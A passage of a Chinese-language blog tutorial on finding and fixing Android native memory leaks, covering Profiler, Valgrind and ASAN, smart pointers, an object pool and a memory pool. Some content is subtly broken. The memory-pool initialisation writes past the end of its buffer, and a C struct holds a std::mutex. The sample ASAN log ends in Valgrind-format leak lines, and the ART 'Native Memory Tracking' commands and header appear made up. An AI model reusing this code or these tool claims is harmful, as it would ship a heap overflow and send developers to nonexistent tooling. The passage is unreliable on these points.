<span class="hljs-type">void</span>* <span class="hljs-title function_">ashmem_create_region</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, <span class="hljs-type">size_t</span> size)</span>;
<span class="hljs-comment">// 分配共享内存，用于跨进程通信</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;
<span class="hljs-comment">// 释放共享内存/映射内存</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length)</span>;

</code></pre>
<p>这类API适合特殊场景（比如跨进程共享数据），但使用门槛更高，比如mmap分配的内存，必须用munmap释放，且要确保addr和length与分配时一致，否则会导致内存泄漏或系统异常。</p>
<h3 data-id="heading-7">1.3 Native内存泄漏：比Java泄漏更“致命”</h3>
<p>Native内存泄漏的本质是：<strong>分配的内存没有被释放，且指向该内存的指针被销毁，导致系统无法回收这部分内存</strong>。和Java内存泄漏相比，它更难排查——Java泄漏可以通过Profiler查看引用链，而Native泄漏没有现成的“引用链”可查，且泄漏的内存会一直占用系统资源，直到APP进程被杀死。</p>
<p>举个典型的泄漏场景：在Native层写一个工具类，提供一个初始化方法，分配内存后存储在全局指针中，但没有提供对应的释放方法。每次调用初始化方法，都会分配新的内存，旧的内存指针被覆盖，再也无法释放，内存会像滚雪球一样越滚越大。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-comment">// 全局指针，持有分配的内存</span>
<span class="hljs-type">char</span>* global_buf = <span class="hljs-literal">NULL</span>;

<span class="hljs-comment">// 初始化方法：分配内存，但未提供释放方法</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">init_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 每次调用都会分配新内存，旧的global_buf指向的内存被泄漏</span>
    global_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 1MB</span>
}

<span class="hljs-comment">// 只调用初始化，不释放</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
        init_buf(); <span class="hljs-comment">// 循环100次，泄漏100MB内存</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<p>这种泄漏看似简单，但在复杂项目中（比如多线程、跨模块调用），很容易被忽略——比如初始化方法被多个地方调用，却没人关注内存是否释放，等到APP闪退时，才发现“锅”在Native层。</p>
<h2 data-id="heading-8">二、工具篇：精准定位Native内存问题（告别“瞎猜”）</h2>
<p>优化的前提是“找到问题”，Native内存问题看不见、摸不着，必须靠工具辅助。下面推荐4个常用工具，从简单到复杂，覆盖“内存监控-泄漏定位-碎片分析”全流程，新手也能快速上手。</p>
<h3 data-id="heading-9">2.1 Android Studio Profiler：快速排查基础问题</h3>
<h4 data-id="heading-10">适用场景：快速查看Native内存整体趋势，判断是否存在内存泄漏、内存暴涨。</h4>
<p>操作步骤：</p>
<ol>
<li>
<p>打开Android Studio，连接真机/模拟器，运行APP；</p>
</li>
<li>
<p>点击底部「Profiler」，选择「Memory」标签，在顶部选择要监控的APP进程；</p>
</li>
<li>
<p>在「Memory Usage」图表中，选择「Native」选项，即可查看Native内存的实时变化。</p>
</li>
</ol>
<p>关键解读：</p>
<ul>
<li>
<p>如果Native内存曲线<strong>持续上涨，且操作完成后（比如关闭页面、停止操作）不下降</strong>，大概率存在内存泄漏；</p>
</li>
<li>
<p>如果内存曲线<strong>频繁波动、暴涨暴跌</strong>，可能是频繁分配/释放小内存块，导致内存碎片严重；</p>
</li>
<li>
<p>缺点：只能看到整体趋势，无法定位到具体的泄漏代码行，适合“初步排查”。</p>
</li>
</ul>
<h3 data-id="heading-11">2.2 Native Memory Tracking（NMT）：Google官方神器</h3>
<h4 data-id="heading-12">适用场景：精准统计Native内存分配详情，定位泄漏的模块/API，支持ART虚拟机的Android 7.0+设备。</h4>
<p>NMT是ART虚拟机提供的Native内存跟踪工具，能统计不同类型的Native内存分配（比如malloc分配、mmap分配、线程栈内存等），还能生成详细的内存报告，帮你找到“内存刺客”。</p>
<h4 data-id="heading-13">实战操作：</h4>
<h5 data-id="heading-14">步骤1：开启NMT跟踪</h5>
<p>在APP启动时，通过adb命令开启NMT（需root权限，或APP拥有DEBUG权限）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启NMT，模式为full（完整跟踪，会有一定性能开销）</span>
adb shell am start -n 包名/主Activity名 --es android.nmt.app_level full

</code></pre>
<p>也可以在Native代码中手动开启：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;art/runtime/native_memory_tracking.h&gt;</span></span>

<span class="hljs-comment">// 开启full模式跟踪</span>
art::NativeMemoryTracking::StartTracking(art::NativeMemoryTracking::kFullTracking);

</code></pre>
<h5 data-id="heading-15">步骤2：生成内存报告</h5>
<p>执行相关操作（比如触发初始化、跳转页面）后，通过adb命令生成内存报告：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成NMT报告，保存到本地文件</span>
adb shell dumpsys meminfo 包名 --native-heap &gt; nmt_report.txt

</code></pre>
<h5 data-id="heading-16">步骤3：分析报告</h5>
<p>打开nmt_report.txt，重点关注「Native Heap Allocations」部分，会按分配类型统计内存使用情况，示例如下：</p>
<pre><code class="hljs language-text" lang="text">Native Heap Allocations:
Total: 120MB
  malloc: 80MB (66.7%)
    libnative-lib.so: 75MB  # 重点！该so库分配了大量内存
      0x7f1234567890: 1MB (malloc, 函数名: init_buf)
      0x7f12345678a0: 1MB (malloc, 函数名: init_buf)
      ...
  mmap: 30MB (25.0%)
  thread stack: 10MB (8.3%)

</code></pre>
<p>从报告中可以看出，「libnative-lib.so」库的「init_buf」函数分配了大量内存，结合代码排查，就能快速定位到泄漏点——比如该函数频繁分配内存却未释放。</p>
<p>小技巧：如果APP使用了多个Native库，可以通过报告中的「libxxx.so」分组，快速锁定内存占用最高的模块，缩小排查范围。</p>
<h3 data-id="heading-17">2.3 Valgrind：Linux老牌工具，精准定位泄漏与野指针</h3>
<h4 data-id="heading-18">适用场景：本地调试Native代码，精准定位内存泄漏、野指针、重复释放等问题，适合C/C++原生开发。</h4>
<p>Valgrind是Linux下的内存调试工具，Android的Native代码本质是Linux程序，因此可以用它进行本地调试。它的核心工具是Memcheck，能监控每一次内存分配/释放，捕捉所有内存异常。</p>
<h4 data-id="heading-19">实战操作（Linux/macOS环境）：</h4>
<h5 data-id="heading-20">步骤1：编译Native代码（带调试信息）</h5>
<p>在CMakeLists.txt中添加调试选项，确保生成的so库包含调试信息（方便定位到代码行）：</p>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.10.2)
project("native-lib")

# 添加调试信息，禁用优化（避免编译器优化导致代码行映射错误）
set(CMAKE_BUILD_TYPE Debug)
set(CMAKE_CXX_FLAGS_DEBUG "-g -O0")

add_library(
        native-lib
        SHARED
        native-lib.cpp
)

# 链接相关库
find_library(
        log-lib
        log
)

target_link_libraries(
        native-lib
        ${log-lib}
)

</code></pre>
<h5 data-id="heading-21">步骤2：用Valgrind运行调试</h5>
<p>将编译好的so库和测试程序放到Linux环境中，执行以下命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用Memcheck工具调试，生成泄漏报告</span>
valgrind --tool=memcheck --leak-check=full --show-leak-kinds=all ./test-native-app
</code></pre>
<h5 data-id="heading-22">步骤3：分析结果</h5>
<p>Valgrind会输出详细的内存异常报告，示例如下：</p>
<pre><code class="hljs language-text" lang="text">==12345== 100MB in 100 blocks are definitely lost in loss record 123
==12345==    at 0x4C2FB0F: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12345==    by 0x1087E9: init_buf (native-lib.cpp:15)
==12345==    by 0x10885A: main (native-lib.cpp:25)

</code></pre>
<p>报告明确指出：在native-lib.cpp的第15行（init_buf函数），通过malloc分配的内存被“明确泄漏”，共100MB，对应我们之前写的泄漏代码。这样就能精准定位到泄漏的代码行，直接修改即可。</p>
<p>缺点：运行速度较慢（会增加程序运行耗时），不适合真机调试，只能用于本地开发阶段排查问题。</p>
<h3 data-id="heading-23">2.4 AddressSanitizer（ASAN）：快速捕捉内存异常（Android 8.0+）</h3>
<h4 data-id="heading-24">适用场景：真机调试，快速捕捉内存泄漏、野指针、缓冲区溢出等问题，性能开销比Valgrind小，适合开发后期验证优化效果。</h4>
<p>ASAN是Google推出的内存错误检测工具，Android 8.0+支持将其集成到APP中，能在运行时实时检测内存异常，并输出详细的错误日志，包括错误类型、代码行号。</p>
<h4 data-id="heading-25">实战操作：</h4>
<h5 data-id="heading-26">步骤1：在CMakeLists.txt中配置ASAN</h5>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.10.2)
project("native-lib")

# 配置ASAN（仅Debug模式启用）
if(CMAKE_BUILD_TYPE STREQUAL "Debug")
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fsanitize=address -fno-omit-frame-pointer")
    set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} -fsanitize=address")
endif()

add_library(
        native-lib
        SHARED
        native-lib.cpp
)

find_library(
        log-lib
        log
)

target_link_libraries(
        native-lib
        ${log-lib}
)

</code></pre>
<h5 data-id="heading-27">步骤2：运行APP并查看日志</h5>
<p>编译Debug版本的APP，安装到Android 8.0+真机上，运行触发内存异常的操作，通过Logcat查看日志，ASAN会输出类似如下的错误信息：</p>
<pre><code class="hljs language-text" lang="text">=================================================================
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f1234567890 at pc 0x7f12345678a0
WRITE of size 4 at 0x7f1234567890 thread T0
    #0 0x7f123456789f in test_free (native-lib.cpp:20)
    #1 0x7f123456790a in main (native-lib.cpp:30)
    ...
==12345==HEAP SUMMARY:
==12345==     in use at exit: 100MB in 100 blocks
==12345==   total heap usage: 101 allocs, 1 frees, 100MB allocated
==12345==
==12345== LEAK SUMMARY:
==12345==    definitely lost: 100MB in 100 blocks
==12345==    indirectly lost: 0 bytes in 0 blocks
==12345==      possibly lost: 0 bytes in 0 blocks
==12345==    still reachable: 0 bytes in 0 blocks
==12345==         suppressed: 0 bytes in 0 blocks

</code></pre>
<p>从日志中可以清晰看到：在native-lib.cpp的第20行，出现了“释放后使用”（heap-use-after-free）的错误，同时存在100MB的内存泄漏。相比Valgrind，ASAN的运行速度更快，且支持真机调试，是开发后期排查Native内存问题的首选工具。</p>
<h2 data-id="heading-28">三、实战优化篇：从代码层面搞定Native内存问题</h2>
<p>找到问题后，就该动手优化了。Native内存优化的核心原则是：<strong>减少不必要的分配、确保内存及时释放、避免内存碎片</strong>。下面从“泄漏修复、内存复用、碎片优化、特殊场景优化”四个维度，结合实战代码讲解具体技巧。</p>
<h3 data-id="heading-29">3.1 内存泄漏修复：从“源头”杜绝泄漏</h3>
<p>内存泄漏是Native内存最常见的问题，修复的关键是“确保分配的内存都能被释放”，针对不同的泄漏场景，有对应的修复方案。</p>
<h4 data-id="heading-30">场景1：全局指针未释放（最常见）</h4>
<p>问题代码：如前文所述，全局指针持有内存，未提供释放方法，导致多次调用初始化函数后泄漏。</p>
<p>修复方案：提供对应的释放函数，在APP退出、模块销毁时调用，同时避免重复分配。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>

<span class="hljs-type">char</span>* global_buf = <span class="hljs-literal">NULL</span>;
<span class="hljs-type">bool</span> is_init = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 标记是否已初始化，避免重复分配</span>

<span class="hljs-comment">// 初始化方法：增加判断，避免重复分配</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">init_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (is_init) {
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 已初始化，直接返回</span>
    }
    global_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 1MB</span>
    <span class="hljs-keyword">if</span> (global_buf != <span class="hljs-literal">NULL</span>) {
        is_init = <span class="hljs-literal">true</span>;
    }
}

<span class="hljs-comment">// 释放方法：在APP退出时调用</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">release_buf</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (global_buf != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(global_buf);
        global_buf = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 置空指针，避免野指针</span>
        is_init = <span class="hljs-literal">false</span>;
    }
}

<span class="hljs-comment">//  APP退出时调用释放函数</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    init_buf();
    <span class="hljs-comment">// 业务逻辑...</span>
    release_buf(); <span class="hljs-comment">// 手动释放，避免泄漏</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h4 data-id="heading-31">场景2：C++对象未调用析构函数</h4>
<p>问题代码：用new创建C++对象后，未用delete释放，或对象是全局/静态的，程序退出前未销毁，导致析构函数未执行，内存泄漏。</p>
<p>修复方案：确保new和delete成对使用；对于全局/静态对象，可使用智能指针（C++11+）自动管理。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span> <span class="hljs-comment">// 智能指针头文件</span></span>

<span class="hljs-comment">// 自定义类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObject</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">MyObject</span>() {
        <span class="hljs-comment">// 构造函数中分配内存</span>
        m_buf = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>];
    }
    ~<span class="hljs-built_in">MyObject</span>() {
        <span class="hljs-comment">// 析构函数中释放内存</span>
        <span class="hljs-keyword">if</span> (m_buf != <span class="hljs-literal">NULL</span>) {
            <span class="hljs-keyword">delete</span>[] m_buf;
            m_buf = <span class="hljs-literal">NULL</span>;
        }
    }
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">char</span>* m_buf;
};

<span class="hljs-comment">// 方案1：手动管理，new和delete成对使用</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_object</span><span class="hljs-params">()</span> </span>{
    MyObject* obj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">MyObject</span>();
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-keyword">delete</span> obj; <span class="hljs-comment">// 手动释放，触发析构函数</span>
}

<span class="hljs-comment">// 方案2：使用智能指针（推荐），自动管理内存</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_smart_ptr</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// unique_ptr：独占所有权，自动释放</span>
    <span class="hljs-function">std::unique_ptr&lt;MyObject&gt; <span class="hljs-title">obj</span><span class="hljs-params">(<span class="hljs-keyword">new</span> MyObject())</span></span>;
    <span class="hljs-comment">// 业务逻辑...</span>
    <span class="hljs-comment">// 无需手动delete，智能指针生命周期结束时自动释放</span>
}

</code></pre>
<p>重点推荐C++11后的智能指针（unique_ptr、shared_ptr），它们能自动管理内存，避免手动释放的遗漏，是C++ Native开发的“内存管家”。但要注意：shared_ptr存在循环引用的问题，会导致内存泄漏，需配合weak_ptr使用。</p>
<h4 data-id="heading-32">场景3：跨模块调用导致的泄漏</h4>
<p>问题场景：Module A分配内存，传递给Module B使用，Module A释放了内存，但Module B还在使用该指针（野指针）；或Module B持有指针，Module A未通知Module B就释放了内存。</p>
<p>修复方案：制定明确的内存管理规范，比如“谁分配、谁释放”，或“分配方提供释放接口，使用方调用后再释放”。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// Module A：分配内存，提供释放接口</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-type">void</span>* <span class="hljs-title function_">alloc_memory</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">malloc</span>(size);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">free_memory</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span> {
    <span class="hljs-keyword">if</span> (ptr != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">free</span>(ptr);
    }
}

<span class="hljs-comment">// Module B：使用Module A分配的内存，调用Module A的释放接口</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"module_a.h"</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">use_memory</span><span class="hljs-params">()</span> {
    <span class="hljs-type">void</span>* buf = alloc_memory(<span class="hljs-number">1024</span>);
    <span class="hljs-comment">// 业务逻辑...</span>
    free_memory(buf); <span class="hljs-comment">// 调用分配方的释放接口，避免泄漏</span>
}

</code></pre>
<h3 data-id="heading-33">3.2 内存复用：减少重复分配，提升效率</h3>
<p>频繁分配/释放小内存块，不仅会导致内存泄漏，还会产生大量内存碎片。内存复用的核心是“重复利用已分配的内存”，减少分配次数，常用方案有“对象池”“内存池”。</p>
<h4 data-id="heading-34">方案1：对象池（适合C++对象复用）</h4>
<p>场景：频繁创建/销毁同类型的C++对象（比如网络请求对象、数据解析对象），每次创建都要分配内存，销毁要释放内存，效率低下。</p>
<p>思路：提前创建一批对象，存放在对象池中，需要时从池中获取，用完后归还给池，避免频繁new/delete。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>

<span class="hljs-comment">// 自定义对象</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkRequest</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">NetworkRequest</span>() { <span class="hljs-comment">/* 构造函数，初始化资源 */</span> }
    ~<span class="hljs-built_in">NetworkRequest</span>() { <span class="hljs-comment">/* 析构函数，释放资源 */</span> }

    <span class="hljs-comment">// 重置对象状态，方便复用</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// 清空请求数据、重置状态</span>
        m_data.<span class="hljs-built_in">clear</span>();
        m_status = <span class="hljs-number">0</span>;
    }

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_request</span><span class="hljs-params">()</span> </span>{ <span class="hljs-comment">/* 发送网络请求 */</span> }

<span class="hljs-keyword">private</span>:
    std::string m_data;
    <span class="hljs-type">int</span> m_status;
};

<span class="hljs-comment">// 对象池类（线程安全）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPool</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 单例模式，避免多实例创建</span>
    <span class="hljs-function"><span class="hljs-type">static</span> RequestPool&amp; <span class="hljs-title">get_instance</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-type">static</span> RequestPool instance;
        <span class="hljs-keyword">return</span> instance;
    }

    <span class="hljs-comment">// 从池中获取对象</span>
    <span class="hljs-function">std::shared_ptr&lt;NetworkRequest&gt; <span class="hljs-title">get_request</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(m_mutex)</span></span>; <span class="hljs-comment">// 线程安全锁</span>
        <span class="hljs-keyword">if</span> (m_pool.<span class="hljs-built_in">empty</span>()) {
            <span class="hljs-comment">// 池为空，创建新对象</span>
            <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">make_shared</span>&lt;NetworkRequest&gt;();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 池中有对象，取出并重置状态</span>
            <span class="hljs-keyword">auto</span> request = m_pool.<span class="hljs-built_in">back</span>();
            m_pool.<span class="hljs-built_in">pop_back</span>();
            request-&gt;<span class="hljs-built_in">reset</span>();
            <span class="hljs-keyword">return</span> request;
        }
    }

    <span class="hljs-comment">// 归还对象到池中</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">release_request</span><span class="hljs-params">(std::shared_ptr&lt;NetworkRequest&gt; request)</span> </span>{
        <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(m_mutex)</span></span>;
        m_pool.<span class="hljs-built_in">push_back</span>(request);
    }

<span class="hljs-keyword">private</span>:
    <span class="hljs-built_in">RequestPool</span>() {} <span class="hljs-comment">// 私有构造，禁止外部创建</span>
    <span class="hljs-built_in">RequestPool</span>(<span class="hljs-type">const</span> RequestPool&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁止拷贝</span>
    RequestPool&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> RequestPool&amp;) = <span class="hljs-keyword">delete</span>; <span class="hljs-comment">// 禁止赋值</span>

    std::vector&lt;std::shared_ptr&lt;NetworkRequest&gt;&gt; m_pool; <span class="hljs-comment">// 对象池容器</span>
    std::mutex m_mutex; <span class="hljs-comment">// 线程安全锁</span>
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_request_pool</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span>&amp; pool = RequestPool::<span class="hljs-built_in">get_instance</span>();
    <span class="hljs-comment">// 从池中获取对象</span>
    <span class="hljs-keyword">auto</span> request = pool.<span class="hljs-built_in">get_request</span>();
    <span class="hljs-comment">// 使用对象</span>
    request-&gt;<span class="hljs-built_in">send_request</span>();
    <span class="hljs-comment">// 归还对象到池中，复用</span>
    pool.<span class="hljs-built_in">release_request</span>(request);
}

</code></pre>
<p>优点：减少对象创建/销毁的次数，避免频繁分配内存；线程安全设计，适合多线程场景；对象复用前重置状态，避免数据污染。</p>
<h4 data-id="heading-35">方案2：内存池（适合C/C++通用内存复用）</h4>
<p>场景：频繁分配/释放固定大小的内存块（比如1KB、4KB），比如图片处理、数据缓存等场景。</p>
<p>思路：提前分配一块大内存，分割成多个固定大小的小内存块，需要时从内存池中获取小内存块，用完后归还给池，避免频繁调用malloc/free。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

<span class="hljs-comment">// 内存块结构</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryBlock</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryBlock</span>* <span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 下一个内存块的指针，用于链表管理</span>
    <span class="hljs-type">bool</span> is_used; <span class="hljs-comment">// 标记是否被使用</span>
    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 内存块的数据区域（柔性数组，不占用结构体大小）</span>
} MemoryBlock;

<span class="hljs-comment">// 内存池结构</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryPool</span> {</span>
    MemoryBlock* head; <span class="hljs-comment">// 内存块链表头</span>
    <span class="hljs-type">size_t</span> block_size; <span class="hljs-comment">// 每个内存块的大小</span>
    <span class="hljs-type">size_t</span> block_count; <span class="hljs-comment">// 内存块的数量</span>
    <span class="hljs-built_in">std</span>::mutex mutex; <span class="hljs-comment">// 线程安全锁</span>
} MemoryPool;

<span class="hljs-comment">// 初始化内存池：分配一块大内存，分割成多个固定大小的内存块</span>
<span class="hljs-type">bool</span> <span class="hljs-title function_">init_memory_pool</span><span class="hljs-params">(MemoryPool* pool, <span class="hljs-type">size_t</span> block_size, <span class="hljs-type">size_t</span> block_count)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || block_size == <span class="hljs-number">0</span> || block_count == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    pool-&gt;block_size = block_size;
    pool-&gt;block_count = block_count;

    <span class="hljs-comment">// 计算总内存大小：内存块链表头 + 每个内存块的大小（结构体大小 + 数据区域大小）</span>
    <span class="hljs-type">size_t</span> total_size = <span class="hljs-keyword">sizeof</span>(MemoryBlock) * block_count + block_size * block_count;
    pool-&gt;head = (MemoryBlock*)<span class="hljs-built_in">malloc</span>(total_size);
    <span class="hljs-keyword">if</span> (pool-&gt;head == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// 初始化内存块链表，将所有内存块标记为未使用</span>
    MemoryBlock* current = pool-&gt;head;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; block_count; i++) {
        current-&gt;is_used = <span class="hljs-literal">false</span>;
        <span class="hljs-comment">// 计算下一个内存块的地址</span>
        current-&gt;next = (MemoryBlock*)((<span class="hljs-type">char</span>*)current + <span class="hljs-keyword">sizeof</span>(MemoryBlock) + block_size);
        current = current-&gt;next;
    }
    current-&gt;next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 链表尾置空</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// 从内存池中获取一块内存</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">alloc_from_pool</span><span class="hljs-params">(MemoryPool* pool)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || pool-&gt;head == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
    }
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(pool-&gt;mutex)</span>;

    <span class="hljs-comment">// 遍历链表，找到未使用的内存块</span>
    MemoryBlock* current = pool-&gt;head;
    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">if</span> (!current-&gt;is_used) {
            current-&gt;is_used = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">return</span> current-&gt;data; <span class="hljs-comment">// 返回数据区域的地址</span>
        }
        current = current-&gt;next;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 没有空闲内存块</span>
}

<span class="hljs-comment">// 归还内存块到内存池</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">free_to_pool</span><span class="hljs-params">(MemoryPool* pool, <span class="hljs-type">void</span>* ptr)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span> || pool-&gt;head == <span class="hljs-literal">NULL</span> || ptr == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title function_">lock</span><span class="hljs-params">(pool-&gt;mutex)</span>;

    <span class="hljs-comment">// 计算内存块的起始地址（数据区域地址 - 结构体大小）</span>
    MemoryBlock* block = (MemoryBlock*)((<span class="hljs-type">char</span>*)ptr - <span class="hljs-keyword">sizeof</span>(MemoryBlock));
    block-&gt;is_used = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 标记为未使用，供下次复用</span>
}

<span class="hljs-comment">// 销毁内存池，释放所有内存</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">destroy_memory_pool</span><span class="hljs-params">(MemoryPool* pool)</span> {
    <span class="hljs-keyword">if</span> (pool == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-built_in">free</span>(pool-&gt;head);
    pool-&gt;head = <span class="hljs-literal">NULL</span>;
    pool-&gt;block_size = <span class="hljs-number">0</span>;
    pool-&gt;block_count = <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    MemoryPool pool;
